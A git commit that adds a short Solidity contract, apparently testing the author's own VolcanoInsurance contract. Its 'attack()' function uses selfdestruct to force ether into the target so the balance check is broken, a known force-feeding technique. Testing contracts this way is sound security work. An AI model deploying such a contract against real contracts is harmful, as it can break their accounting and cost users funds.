c0c1bec28a96f89ada76b9e50a833fa29515e44b
Marcus Wentz <52706599+MarcusWentz@users.noreply.github.com>
2021-11-22 19:11:17 -0500

    Add files via upload

---
+++ contracts/SelfDestructTestWorked.sol
@@ -0,0 +1,22 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+import "./VolcanoInsuranceV33.sol";
+
+contract SelfDestructSendOneEthereum {
+    VolcanoInsurance VolcanoInsuranceInstance;
+
+    constructor(VolcanoInsurance VolcanoInsuranceAddress) {
+        VolcanoInsuranceInstance = VolcanoInsurance(VolcanoInsuranceAddress);
+    }
+
+    function attack() public payable {
+        // You can simply break the game by sending ether so that
+        // the game balance >= 7 ether
+
+        // cast address to payable
+        address payable addr = payable(address(VolcanoInsuranceInstance));
+        selfdestruct(addr);
+    }
+}
+
